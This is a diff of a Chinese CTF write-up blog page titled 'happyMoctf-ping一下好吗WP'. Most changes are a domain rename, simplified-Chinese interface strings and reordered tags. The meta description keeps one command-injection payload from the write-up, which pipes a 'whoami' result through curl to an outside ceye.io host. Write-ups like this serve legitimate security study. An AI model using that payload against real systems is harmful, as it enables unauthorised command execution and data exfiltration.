@@ -15,7 +15,7 @@
 <meta name="keywords" content="ctf,Web,漏洞研究">
 <meta property="og:type" content="article">
 <meta property="og:title" content="happyMoctf-ping一下好吗WP">
-<meta property="og:url" content="http://www.daiker.com.cn/2018/02/15/happyMoctf-ping一下好吗WP/index.html">
+<meta property="og:url" content="http://www.daikersec.com/2018/02/15/happyMoctf-ping一下好吗WP/index.html">
 <meta property="og:site_name">
 <meta property="og:description" content="0x00 前言这道题着重点在于没有回显的命令执行，waf也侧重在于防止反弹shell，一般的命令没有过滤。对于没有回显的命令执行一般可以通过DNS通道/HTTP通道和反弹shell。 0x01 DNS通道/HTTP通道post ip=0.0.0.0|curl *.ceye.io/`whoami`，在ceye那个网站可以看到有返回消息(Linux在命令参数执行命令的有`` 和$()两种，这里()被过">
 <meta property="og:locale" content="zh-Hans">
@@ -58,7 +58,7 @@
 				<h1 class="site-name"><a href="/" title=""></a></h1>
 				<h2 class="blog-motto"></h2>
 			</div>
-			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜單">
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
 			</a></div>
 			<nav class="animated">
 				<ul>
@@ -98,14 +98,14 @@
 		<a href="/about" title="daiker" target="_blank" itemprop="author">daiker</a>
 		
   <p class="article-time">
-    <time datetime="2018-02-15T10:39:15.000Z" itemprop="datePublished"> 發表於 2018-02-15</time>
+    <time datetime="2018-02-15T10:39:15.000Z" itemprop="datePublished"> 发表于 2018-02-15</time>
     
   </p>
 </header>
 	<div class="article-content">
 		
 		<div id="toc" class="toc-article">
-			<strong class="toc-title">文章目錄</strong>
+			<strong class="toc-title">文章目录</strong>
 		
 			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text"><a href="#0x00-&#x524D;&#x8A00;" class="headerlink" title="0x00 &#x524D;&#x8A00;"></a>0x00 &#x524D;&#x8A00;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-DNS通道-HTTP通道"><span class="toc-number">2.</span> <span class="toc-text"><a href="#0x01-DNS&#x901A;&#x9053;-HTTP&#x901A;&#x9053;" class="headerlink" title="0x01 DNS&#x901A;&#x9053;/HTTP&#x901A;&#x9053;"></a>0x01 DNS&#x901A;&#x9053;/HTTP&#x901A;&#x9053;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-反弹shell"><span class="toc-number">3.</span> <span class="toc-text"><a href="#0x02-&#x53CD;&#x5F39;shell" class="headerlink" title="0x02 &#x53CD;&#x5F39;shell"></a>0x02 &#x53CD;&#x5F39;shell</span></a></li></ol>
 		
@@ -137,7 +137,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://www.daiker.com.cn/2018/02/15/happyMoctf-ping一下好吗WP/" data-title="happyMoctf-ping一下好吗WP | " data-tsina="5688081717" class="share clearfix">
+	  <div data-url="http://www.daikersec.com/2018/02/15/happyMoctf-ping一下好吗WP/" data-title="happyMoctf-ping一下好吗WP | " data-tsina="5688081717" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -171,24 +171,24 @@
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="2018/02/15/happyMoctf-ping一下好吗WP/" data-title="happyMoctf-ping一下好吗WP" data-url="http://www.daiker.com.cn/2018/02/15/happyMoctf-ping一下好吗WP/"></div>
+	<div class="ds-thread" data-thread-key="2018/02/15/happyMoctf-ping一下好吗WP/" data-title="happyMoctf-ping一下好吗WP" data-url="http://www.daikersec.com/2018/02/15/happyMoctf-ping一下好吗WP/"></div>
 </section>
 
 
 
 
 </div>  
-      <div class="openaside"><a class="navbutton" href="#" title="顯示側邊欄"></a></div>
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
 
   <div id="toc" class="toc-aside">
-  <strong class="toc-title">文章目錄</strong>
+  <strong class="toc-title">文章目录</strong>
  
  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text"><a href="#0x00-&#x524D;&#x8A00;" class="headerlink" title="0x00 &#x524D;&#x8A00;"></a>0x00 &#x524D;&#x8A00;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-DNS通道-HTTP通道"><span class="toc-number">2.</span> <span class="toc-text"><a href="#0x01-DNS&#x901A;&#x9053;-HTTP&#x901A;&#x9053;" class="headerlink" title="0x01 DNS&#x901A;&#x9053;/HTTP&#x901A;&#x9053;"></a>0x01 DNS&#x901A;&#x9053;/HTTP&#x901A;&#x9053;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-反弹shell"><span class="toc-number">3.</span> <span class="toc-text"><a href="#0x02-&#x53CD;&#x5F39;shell" class="headerlink" title="0x02 &#x53CD;&#x5F39;shell"></a>0x02 &#x53CD;&#x5F39;shell</span></a></li></ol>
  
   </div>
 
 <div id="asidepart">
-<div class="closeaside"><a class="closebutton" href="#" title="隱藏側邊欄"></a></div>
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
 <aside class="clearfix">
 
   
@@ -202,7 +202,7 @@
 
   
 <div class="categorieslist">
-	<p class="asidetitle">分類</p>
+	<p class="asidetitle">分类</p>
 		<ul>
 		
 		  
@@ -235,7 +235,7 @@
 
   
 <div class="tagslist">
-	<p class="asidetitle">標簽</p>
+	<p class="asidetitle">标签</p>
 		<ul class="clearfix">
 		
 			
@@ -251,15 +251,19 @@
 			
 		
 			
-				<li><a href="/tags/注入/" title="注入">注入<sup>2</sup></a></li>
-			
-		
-			
 				<li><a href="/tags/Linux/" title="Linux">Linux<sup>2</sup></a></li>
 			
 		
 			
+				<li><a href="/tags/注入/" title="注入">注入<sup>2</sup></a></li>
+			
+		
+			
 				<li><a href="/tags/漏洞研究/" title="漏洞研究">漏洞研究<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/CTF/" title="CTF">CTF<sup>1</sup></a></li>
 			
 		
 			
@@ -271,15 +275,7 @@
 			
 		
 			
-				<li><a href="/tags/CTF/" title="CTF">CTF<sup>1</sup></a></li>
-			
-		
-			
 				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/php/" title="php">php<sup>1</sup></a></li>
 			
 		
 			
@@ -298,19 +294,23 @@
 				<li><a href="/tags/tools/" title="tools">tools<sup>1</sup></a></li>
 			
 		
+			
+				<li><a href="/tags/php/" title="php">php<sup>1</sup></a></li>
+			
+		
 		</ul>
 </div>
 
 
   
   <div class="archiveslist">
-    <p class="asidetitle"><a href="/archives">歸檔</a></p>
+    <p class="asidetitle"><a href="/archives">归档</a></p>
       <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a><span class="archive-list-count">3</span></li></ul>
   </div>
 
 
   <div class="rsspart">
-	<a href="/atom.xml" target="_blank" title="rss">RSS 訂閱</a>
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
 </div>
 
 </aside>
@@ -550,7 +550,7 @@ var _hmt = _hmt || [];
 <!-- Totop Begin -->
 
 	<div id="totop">
-	<a title="返回頂部"><img src="/img/scrollup.png"/></a>
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 	</div>
 	<script src="/js/totop.js"></script>
 
